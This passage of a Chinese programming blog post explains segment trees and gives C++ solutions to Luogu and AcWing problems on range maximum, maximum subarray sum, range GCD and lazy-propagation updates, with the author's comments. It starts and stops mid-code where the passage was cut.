class="number">-1</span>]),<span class="built_in">add</span>(tr2,i,(ll)i*(a[i]-a[i<span class="number">-1</span>]));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(m--)&#123;</span><br><span class="line">       <span class="type">int</span> tag;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;tag);</span><br><span class="line">    <span class="keyword">if</span>(tag==<span class="number">1</span>)&#123;</span><br><span class="line">        ll c;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%lld%lld%lld&quot;</span>,&amp;l,&amp;r,&amp;c);</span><br><span class="line">        <span class="built_in">add</span>(tr1,l,c),<span class="built_in">add</span>(tr1,r+<span class="number">1</span>,-c),<span class="built_in">add</span>(tr2,l,l*c),<span class="built_in">add</span>(tr2,r+<span class="number">1</span>,(r+<span class="number">1</span>)*-c);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(tag==<span class="number">2</span>)&#123;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%lld%lld&quot;</span>,&amp;l,&amp;r);</span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">&quot;%lld\n&quot;</span>,<span class="built_in">p_sum</span>(l,r));</span><br><span class="line">    &#125;  </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="线段树"><a href="#线段树" class="headerlink" title="线段树"></a>线段树</h2><h3 id="初识线段树"><a href="#初识线段树" class="headerlink" title="初识线段树"></a>初识线段树</h3><blockquote>
<p>代码量巨大</p>
</blockquote>
<p>基本操作实现</p>
<ul>
<li>pushup()</li>
<li>build():生成线段树</li>
<li>modify()<ul>
<li>修改单点(从上往下递归)</li>
<li>修改区间,使用pushdown操作(懒标记)</li>
</ul>
</li>
<li>query():查询某一段区间信息</li>
</ul>
<p>原理:接近满二叉树,区间折半分,每一个父节点有两个子节点(除了最后一层),此类似于堆,故用一维数组来存整一棵树</p>
<img src="https://cdn.jsdelivr.net/gh/zhzvite/picgoroom@img/img/202402111928073.png" alt="image-20240208122807873" style="zoom:50%;" />

<p>类似于这样,将一个根区间折半依次向下递归划分,query的时间复杂度接近(4logn)</p>
<p>空间最大接近4n,故要开四倍空间</p>
<h4 id="修改单点值-动态查询区间最大值"><a href="#修改单点值-动态查询区间最大值" class="headerlink" title="修改单点值+动态查询区间最大值"></a><a href="https://www.luogu.com.cn/problem/P1198">修改单点值+动态查询区间最大值</a></h4><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">typedef</span> <span class="type">long</span> <span class="type">long</span> ll;</span><br><span class="line"><span class="type">const</span> <span class="type">int</span> N=<span class="number">2e5</span>+<span class="number">10</span>;</span><br><span class="line"><span class="type">int</span> m,n,p,last;</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">node</span>&#123;</span><br><span class="line">    <span class="type">int</span> l,r;</span><br><span class="line">    <span class="type">int</span> v;</span><br><span class="line">&#125;tr[<span class="number">4</span>*N];</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">pushup</span><span class="params">(<span class="type">int</span> u)</span></span>&#123;</span><br><span class="line">    tr[u].v=<span class="built_in">max</span>(tr[u&lt;&lt;<span class="number">1</span>].v,tr[u&lt;&lt;<span class="number">1</span>|<span class="number">1</span>].v);<span class="comment">//更新父节点</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">build</span><span class="params">(<span class="type">int</span> u,<span class="type">int</span> l,<span class="type">int</span> r)</span></span>&#123;<span class="comment">//初始化这一颗树</span></span><br><span class="line">    tr[u].l=l;</span><br><span class="line">    tr[u].r=r;</span><br><span class="line">    tr[u]=&#123;l,r&#125;;<span class="comment">//为什么这个在vscode里面会报错</span></span><br><span class="line">    <span class="keyword">if</span>(l==r)<span class="keyword">return</span> ;</span><br><span class="line">    <span class="type">int</span> mid=l+r&gt;&gt;<span class="number">1</span>;</span><br><span class="line">    <span class="built_in">build</span>(u&lt;&lt;<span class="number">1</span>,l,mid);</span><br><span class="line">    <span class="built_in">build</span>(u&lt;&lt;<span class="number">1</span>|<span class="number">1</span>,mid+<span class="number">1</span>,r);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">query</span><span class="params">(<span class="type">int</span> u,<span class="type">int</span> l,<span class="type">int</span> r)</span></span>&#123;<span class="comment">//查询队列</span></span><br><span class="line">    <span class="keyword">if</span>(tr[u].l&gt;=l&amp;&amp;tr[u].r&lt;=r)<span class="keyword">return</span> tr[u].v;</span><br><span class="line">    <span class="type">int</span> mid=tr[u].l+tr[u].r&gt;&gt;<span class="number">1</span>;</span><br><span class="line">    <span class="type">int</span> v=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span>(l&lt;=mid)v=<span class="built_in">query</span>(u&lt;&lt;<span class="number">1</span>,l,r);</span><br><span class="line">    <span class="keyword">if</span>(r&gt;mid)v=<span class="built_in">max</span>(v,<span class="built_in">query</span>(u&lt;&lt;<span class="number">1</span>|<span class="number">1</span>,l,r));<span class="comment">//其实感觉这里你把区间划分了也是能过的</span></span><br><span class="line">    <span class="keyword">return</span> v;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">modify</span><span class="params">(<span class="type">int</span> u,<span class="type">int</span> x,<span class="type">int</span> v)</span></span>&#123;<span class="comment">//修改单点</span></span><br><span class="line">    <span class="keyword">if</span>(tr[u].l==x&amp;&amp;tr[u].r==x)tr[u].v=v;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="type">int</span> mid=tr[u].l+tr[u].r&gt;&gt;<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">if</span>(x&lt;=mid)<span class="built_in">modify</span>(u&lt;&lt;<span class="number">1</span>,x,v);</span><br><span class="line">        <span class="keyword">if</span>(x&gt;mid)<span class="built_in">modify</span>(u&lt;&lt;<span class="number">1</span>|<span class="number">1</span>,x,v);</span><br><span class="line">        <span class="built_in">pushup</span>(u);<span class="comment">//把当前儿子的最大值信息回溯以下,更新他的父节点</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%d%d&quot;</span>,&amp;m,&amp;p);</span><br><span class="line">  <span class="built_in">build</span>(<span class="number">1</span>,<span class="number">1</span>,m);</span><br><span class="line">  <span class="keyword">while</span>(m--)&#123;</span><br><span class="line">    <span class="type">char</span> op[<span class="number">2</span>];</span><br><span class="line">    ll x;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%s%lld&quot;</span>,op,&amp;x);</span><br><span class="line">    <span class="keyword">if</span>(*op==<span class="string">&#x27;Q&#x27;</span>)&#123;</span><br><span class="line">       last= <span class="built_in">query</span>(<span class="number">1</span>,n-x+<span class="number">1</span>,n);</span><br><span class="line">       <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,last);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        x=(x+last)%p;</span><br><span class="line">        <span class="built_in">modify</span>(<span class="number">1</span>,n+<span class="number">1</span>,x);</span><br><span class="line">        n++;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>

<h4 id="单点修改-区间最大连续和"><a href="#单点修改-区间最大连续和" class="headerlink" title="单点修改+区间最大连续和"></a><a href="https://www.luogu.com.cn/problem/P4513">单点修改+区间最大连续和</a></h4><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">//维护区间范围内的连续得分最大值</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="type">const</span> <span class="type">int</span> N = <span class="number">5e5</span> + <span class="number">10</span>;</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">node</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> l, r;</span><br><span class="line">    <span class="type">int</span> sum, lmax, rmax, tmax;</span><br><span class="line">&#125; tr[<span class="number">4</span> * N];</span><br><span class="line"><span class="type">int</span> w[N];</span><br><span class="line"><span class="type">int</span> n, m;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">pushup</span><span class="params">(node &amp;u, node &amp;l, node &amp;r)</span></span></span><br><span class="line"><span class="function"></span>&#123; <span class="comment">// 负责更新父节点</span></span><br><span class="line">    u.sum = l.sum + r.sum;<span class="comment">//更新总和</span></span><br><span class="line">    u.lmax = <span class="built_in">max</span>(l.lmax, l.sum + r.lmax);<span class="comment">//更新父节点的左最大值</span></span><br><span class="line">    u.rmax = <span class="built_in">max</span>(r.rmax, r.sum + l.rmax);<span class="comment">//更新父节点的右最大值</span></span><br><span class="line">    u.tmax = <span class="built_in">max</span>(l.tmax, <span class="built_in">max</span>(r.tmax, l.rmax + r.lmax));</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">pushup</span><span class="params">(<span class="type">int</span> u)</span></span></span><br><span class="line"><span class="function"></span>&#123; <span class="comment">// 函数重载</span></span><br><span class="line">    <span class="built_in">pushup</span>(tr[u], tr[u &lt;&lt; <span class="number">1</span>], tr[u &lt;&lt; <span class="number">1</span> | <span class="number">1</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">build</span><span class="params">(<span class="type">int</span> u, <span class="type">int</span> l, <span class="type">int</span> r)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (l == r)</span><br><span class="line">    &#123;</span><br><span class="line">        tr[u] = &#123;l, r, w[r], w[r], w[r], w[r]&#125;;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        tr[u] = &#123;l, r&#125;;</span><br><span class="line">        <span class="type">int</span> mid = l + r &gt;&gt; <span class="number">1</span>;</span><br><span class="line">        <span class="built_in">build</span>(u &lt;&lt; <span class="number">1</span>, l, mid), <span class="built_in">build</span>(u &lt;&lt; <span class="number">1</span> | <span class="number">1</span>, mid + <span class="number">1</span>, r);</span><br><span class="line">        <span class="built_in">pushup</span>(u);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">modify</span><span class="params">(<span class="type">int</span> u, <span class="type">int</span> x, <span class="type">int</span> v)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (tr[u].l == x &amp;&amp; tr[u].r == x)</span><br><span class="line">        tr[u].lmax = v, tr[u].rmax = v, tr[u].sum = v, tr[u].tmax = v;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">int</span> mid = tr[u].l + tr[u].r &gt;&gt; <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">if</span> (x &lt;= mid)</span><br><span class="line">            <span class="built_in">modify</span>(u &lt;&lt; <span class="number">1</span>, x, v);</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="built_in">modify</span>(u &lt;&lt; <span class="number">1</span> | <span class="number">1</span>, x, v);</span><br><span class="line">        <span class="built_in">pushup</span>(u);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function">node <span class="title">query</span><span class="params">(<span class="type">int</span> u, <span class="type">int</span> l, <span class="type">int</span> r)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (tr[u].l &gt;= l &amp;&amp; tr[u].r &lt;= r)</span><br><span class="line">        <span class="keyword">return</span> tr[u];</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">int</span> mid = tr[u].l + tr[u].r &gt;&gt; <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">if</span> (r &lt;= mid)</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">query</span>(u &lt;&lt; <span class="number">1</span>, l, r);</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (l &gt; mid)</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">query</span>(u &lt;&lt; <span class="number">1</span> | <span class="number">1</span>, l, r);</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">auto</span> left = <span class="built_in">query</span>(u &lt;&lt; <span class="number">1</span>, l, r);</span><br><span class="line">            <span class="keyword">auto</span> right = <span class="built_in">query</span>(u &lt;&lt; <span class="number">1</span> | <span class="number">1</span>, l, r);</span><br><span class="line">            node res;</span><br><span class="line">            <span class="built_in">pushup</span>(res, left, right);</span><br><span class="line">            <span class="keyword">return</span> res;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d%d&quot;</span>, &amp;n, &amp;m);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i++)</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;w[i]);</span><br><span class="line">    <span class="built_in">build</span>(<span class="number">1</span>, <span class="number">1</span>, n);</span><br><span class="line">    <span class="type">int</span> k, x, y;</span><br><span class="line">    <span class="keyword">while</span> (m--)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d%d%d&quot;</span>, &amp;k, &amp;x, &amp;y);</span><br><span class="line">        <span class="keyword">if</span> (k == <span class="number">1</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (x &gt; y)</span><br><span class="line">                <span class="built_in">swap</span>(x, y);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, <span class="built_in">query</span>(<span class="number">1</span>, x, y).tmax);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="built_in">modify</span>(<span class="number">1</span>, x, y);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="区间修改-区间最大公约数"><a href="#区间修改-区间最大公约数" class="headerlink" title="区间修改+区间最大公约数"></a><a href="https://www.acwing.com/problem/content/247/">区间修改+区间最大公约数</a></h4><p>思路:转化成差分数组</p>
<p>gcd(a,b,c)&#x3D;gcd(a,b-a,c-b);故每次我们把第l+1到r的差分最大公约数与1到l的差分前缀和取一个gcd就能得到答案所求</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">typedef</span> <span class="type">long</span> <span class="type">long</span> LL;</span><br><span class="line"><span class="type">const</span> <span class="type">int</span> N=<span class="number">5e5</span>+<span class="number">10</span>;</span><br><span class="line">LL w[N];</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">node</span>&#123;</span><br><span class="line">    <span class="type">int</span> l,r;</span><br><span class="line">    LL  sum,d;</span><br><span class="line">&#125;tr[<span class="number">4</span>*N];</span><br><span class="line"><span class="type">int</span> n,m;</span><br><span class="line"><span class="function">LL <span class="title">gcd</span><span class="params">(LL a,LL b)</span></span>&#123;</span><br><span class="line">  <span class="keyword">return</span> b?<span class="built_in">gcd</span>(b,a%b): a;<span class="comment">//可能求出来负数,需要加一个abs取绝对值</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">pushup</span><span class="params">(node &amp;u,node &amp;l,node &amp;r)</span></span>&#123;</span><br><span class="line">    u.sum=l.sum+r.sum;</span><br><span class="line">    u.d=<span class="built_in">gcd</span>(l.d,r.d);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">pushup</span><span class="params">(<span class="type">int</span> u)</span></span>&#123;</span><br><span class="line">    <span class="built_in">pushup</span>(tr[u],tr[u&lt;&lt;<span class="number">1</span>],tr[u&lt;&lt;<span class="number">1</span>|<span class="number">1</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">build</span><span class="params">(<span class="type">int</span> u,<span class="type">int</span> l,<span class="type">int</span> r)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(l==r)&#123;</span><br><span class="line">        LL b=w[l]-w[l<span class="number">-1</span>];</span><br><span class="line">        tr[u]=&#123;l,r,b,b&#125;;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        tr[u]=&#123;l,r&#125;;</span><br><span class="line">        <span class="type">int</span> mid=l+r&gt;&gt;<span class="number">1</span>;</span><br><span class="line">        <span class="built_in">build</span>(u&lt;&lt;<span class="number">1</span>,l,mid),<span class="built_in">build</span>(u&lt;&lt;<span class="number">1</span>|<span class="number">1</span>,mid+<span class="number">1</span>,r);</span><br><span class="line">        <span class="built_in">pushup</span>(u);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">modify</span><span class="params">(<span class="type">int</span> u,<span class="type">int</span> x,LL v)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(tr[u].l==x&amp;&amp;tr[u].r==x)&#123;</span><br><span class="line">        LL b=tr[u].sum+v;</span><br><span class="line">        tr[u]=&#123;x,x,b,b&#125;;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="type">int</span> mid=tr[u].l+tr[u].r&gt;&gt;<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">if</span>(x&lt;=mid)<span class="built_in">modify</span>(u&lt;&lt;<span class="number">1</span>,x,v);</span><br><span class="line">        <span class="keyword">else</span> <span class="built_in">modify</span>(u&lt;&lt;<span class="number">1</span>|<span class="number">1</span>,x,v);</span><br><span class="line">        <span class="built_in">pushup</span>(u);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function">node <span class="title">query</span><span class="params">(<span class="type">int</span> u,<span class="type">int</span> l,<span class="type">int</span> r)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(l&gt;r)<span class="keyword">return</span> &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">if</span>(tr[u].l&gt;=l&amp;&amp;tr[u].r&lt;=r)<span class="keyword">return</span> tr[u];</span><br><span class="line">    <span class="type">int</span> mid=tr[u].l+tr[u].r&gt;&gt;<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span>(r&lt;=mid)<span class="keyword">return</span> <span class="built_in">query</span>(u&lt;&lt;<span class="number">1</span>,l,r); </span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(l&gt;mid)  <span class="keyword">return</span>  <span class="built_in">query</span>(u&lt;&lt;<span class="number">1</span>|<span class="number">1</span>,l,r);</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">auto</span> left=<span class="built_in">query</span>(u&lt;&lt;<span class="number">1</span>,l,r),right=<span class="built_in">query</span>(u&lt;&lt;<span class="number">1</span>|<span class="number">1</span>,l,r);</span><br><span class="line">        node res;</span><br><span class="line">        <span class="built_in">pushup</span>(res,left,right);</span><br><span class="line">        <span class="keyword">return</span> res; </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">   <span class="built_in">scanf</span>(<span class="string">&quot;%d%d&quot;</span>,&amp;n,&amp;m);</span><br><span class="line">   <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;=n;i++)<span class="built_in">scanf</span>(<span class="string">&quot;%lld&quot;</span>,&amp;w[i]);</span><br><span class="line">   <span class="built_in">build</span>(<span class="number">1</span>,<span class="number">1</span>,n);</span><br><span class="line">   <span class="type">int</span> l,r;</span><br><span class="line">   LL d;</span><br><span class="line">   <span class="type">char</span> op[<span class="number">2</span>];</span><br><span class="line">   <span class="keyword">while</span>(m--)&#123;</span><br><span class="line">       <span class="built_in">scanf</span>(<span class="string">&quot;%s%d%d&quot;</span>,op,&amp;l,&amp;r);</span><br><span class="line">   <span class="keyword">if</span>(*op==<span class="string">&#x27;Q&#x27;</span>)&#123;</span><br><span class="line">      <span class="keyword">auto</span> left=<span class="built_in">query</span>(<span class="number">1</span>,<span class="number">1</span>,l),right=<span class="built_in">query</span>(<span class="number">1</span>,l+<span class="number">1</span>,r);</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;%lld\n&quot;</span>,<span class="built_in">abs</span>(<span class="built_in">gcd</span>(left.sum,right.d)));</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%lld&quot;</span>,&amp;d);</span><br><span class="line">    <span class="built_in">modify</span>(<span class="number">1</span>,l,d);</span><br><span class="line">    <span class="keyword">if</span>(r+<span class="number">1</span>&lt;=n)<span class="built_in">modify</span>(<span class="number">1</span>,r+<span class="number">1</span>,-d);</span><br><span class="line">   &#125;&#125;&#125;</span><br></pre></td></tr></table></figure>

<h3 id="入门线段树"><a href="#入门线段树" class="headerlink" title="入门线段树"></a>入门线段树</h3><h4 id="懒标记"><a href="#懒标记" class="headerlink" title="懒标记"></a><a href="https://www.luogu.com.cn/problem/P3373">懒标记</a></h4><p>pushdown操作专门运用区间修改</p>
<p>信息:</p>
<ol>
<li><p>sum表示只考虑当前节点和子节点上的所有标记,当前区间的总和</p>
</li>
<li><p>add为懒标记,表示给当前区间的所有数字同时加上一个add</p>
</li>
</ol>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">typedef</span> <span class="type">long</span> <span class="type">long</span> ll;</span><br><span class="line"><span class="type">const</span> <span class="type">int</span> N=<span class="number">1e5</span>+<span class="number">10</span>;</span><br><span class="line"><span class="type">int</span> n,q,m=<span class="number">571373</span>;</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">node</span>&#123;</span><br><span class="line">    <span class="type">int</span> l,r;</span><br><span class="line">    ll sum,add,mul;</span><br><span class="line">&#125;tr[<span class="number">4</span>*N];</span><br><span class="line">ll w[N];</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">eval</span><span class="params">(node &amp;t,ll add,ll mul)</span></span>&#123;<span class="comment">//在这里负责执行sum,mul,add的更新操作,每次执行先乘后加的顺序即sum*mul+add</span></span><br><span class="line">    t.sum=(ll)(t.sum*mul+(t.r-t.l+<span class="number">1</span>)*add)%m;</span><br><span class="line">    t.mul=(t.mul*mul)%m;</span><br><span class="line">    t.add=(t.add*mul+add)%m;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">pushup</span><span class="params">(<span class="type">int</span> u)</span></span>&#123;</span><br><span class="line">    tr[u].sum=(tr[u&lt;&lt;<span class="number">1</span>].sum+tr[u&lt;&lt;<span class="number">1</span>|<span class="number">1</span>].sum)%m;<span class="comment">//把子节点信息向上传递,只用传递sum</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">pushdown</span><span class="params">(<span class="type">int</span> u)</span></span>&#123;</span><br><span class="line">     <span class="built_in">eval</span>(tr[u&lt;&lt;<span class="number">1</span>],tr[u].add,tr[u].mul),<span class="built_in">eval</span>(tr[u&lt;&lt;<span class="number">1</span>|<span class="number">1</span>],tr[u].add,tr[u].mul);<span class="comment">//拆分</span></span><br><span class="line">     tr[u].add=<span class="number">0</span>,tr[u].mul=<span class="number">1</span>;<span class="comment">//重置父节点的add和mul懒标记</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">build</span><span class="params">(<span class="type">int</span> u,<span class="type">int</span> l,<span class="type">int</span> r)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(l==r)tr[u]=&#123;l,r,w[l],<span class="number">0</span>,<span class="number">1</span>&#125;;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        tr[u]=&#123;l,r&#125;;</span><br><span class="line">        tr[u].mul=<span class="number">1</span>;</span><br><span class="line">        <span class="type">int</span> mid=l+r&gt;&gt;<span class="number">1</span>;</span><br><span class="line">        <span class="built_in">build</span>(u&lt;&lt;<span class="number">1</span>,l,mid),<span class="built_in">build</span>(u&lt;&lt;<span class="number">1</span>|<span class="number">1</span>,mid+<span class="number">1</span>,r);</span><br><span class="line">        <span class="built_in">pushup</span>(u);<span class="comment">//更新完子节点要更新父节点</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">modify</span><span class="params">(<span class="type">int</span> u,<span class="type">int</span> l,<span class="type">int</span> r,ll ADD,ll MUL)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(tr[u].l&gt;=l&amp;&amp;tr[u].r&lt;=r)<span class="built_in">eval</span>(tr[u],ADD,MUL);<span class="comment">//符合情况的直接修改add和mul和sum</span></span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">pushdown</span>(u);<span class="comment">//拆分</span></span><br><span class="line">        <span class="type">int</span> mid=tr[u].l+tr[u].r&gt;&gt;<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">if</span>(l&lt;=mid)<span class="built_in">modify</span>(u&lt;&lt;<span class="number">1</span>,l,r,ADD,MUL);</span><br><span class="line">        <span class="keyword">if</span>(r&gt;mid)<span class="built_in">modify</span>(u&lt;&lt;<span class="number">1</span>|<span class="number">1</span>,l,r,ADD,MUL);</span><br><span class="line">        <span class="built_in">pushup</span>(u);<span class="comment">//修改完回溯更新</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function">ll <span class="title">query</span><span class="params">(<span class="type">int</span> u,<span class="type">int</span> l,<span class="type">int</span> r)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(tr[u].l&gt;=l&amp;&amp;tr[u].r&lt;=r)<span class="keyword">return</span> tr[u].sum;</span><br><span class="line">    <span class="built_in">pushdown</span>(u);</span><br><span class="line">    <span class="type">int</span> mid=tr[u].l+tr[u].r&gt;&gt;<span class="number">1</span>;</span><br><span class="line">    ll summ=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span>(l&lt;=mid)summ=<span class="built_in">query</span>(u&lt;&lt;<span class="number">1</span>,l,r);</span><br><span class="line">    <span class="keyword">if</span>(r&gt;mid)summ+=<span class="built_in">query</span>(u&lt;&lt;<span class="number">1</span>|<span class="number">1</span>,l,r);</span><br><span class="line">    <span class="keyword">return</span> summ;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d%d%d&quot;</span>,&amp;n,&amp;q,&amp;m);</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;=n;i++)<span class="built_in">scanf</span>(<span class="string">&quot;%lld&quot;</span>,&amp;w[i]);</span><br><span class="line">    <span class="built_in">build</span> (<span class="number">1</span>,<span class="number">1</span>,n);</span><br><span class="line">    <span class="keyword">while</span>(q--)&#123;</span><br><span class="line">       <span class="type">int</span> t;</span><br><span class="line">        ll l,r,k;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d%lld%lld&quot;</span>,&amp;t,&amp;l,&amp;r);</span><br><span class="line">        <span class="keyword">if</span>(t==<span class="number">1</span>)&#123;</span><br><span class="line">            <span class="built_in">scanf</span>(<span class="string">&quot;%lld&quot;</span>,&amp;k);</span><br><span class="line">            <span class="built_in">modify</span>(<span class="number">1</span>,l,r,<span class="number">0</span>,k);<span class="comment">//只乘不加则add=0</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(t==<span class="number">2</span>)&#123;</span><br><span class="line">             <span 